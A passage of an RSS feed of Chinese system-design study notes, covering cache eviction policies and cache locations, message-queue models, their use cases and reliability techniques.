最大空间 # 缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。
当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。
淘汰策略 # FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。
LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。
LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。
二、缓存位置 # 浏览器 # 当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。
ISP # 网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。
反向代理 # 反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。
本地缓存 # 使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。
分布式缓存 # 使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。
相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。
数据库缓存 # MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。
Java 内部的缓存 # Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。
CPU 多级缓存 # CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。</description>
    </item>
    
    <item>
      <title>消息队列</title>
      <link>https://example.com/keeplearning/docs/system-design/queue-message/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/system-design/queue-message/</guid>
      <description> 消息队列 # 一、消息模型 # 点对点 # 消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。
发布/订阅 # 消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。
发布与订阅模式和观察者模式有以下不同：
观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。 二、使用场景 # 异步处理 # 发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。
例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。
只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。
流量削锋 # 在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。
可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。
应用解耦 # 如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。
通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。
三、可靠性 # 发送端的可靠性 # 发送端完成操作后一定能将消息成功发送到消息队列中。
实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。
接收端的可靠性 # 接收端能够从消息队列成功消费一次消息。
两种实现方法：
保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。 参考资料 # Observer vs Pub-Sub 消息队列中点对点与发布订阅区别 </description>
    </item>
    
    <item>
      <title>😪xxxxxx</title>
      <link>https://example.com/keeplearning/docs/hidden/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://example.com/keeplearning/docs/hidden/</guid>
      <description> Go </description>
    </item>
    
  </channel>
</rss>
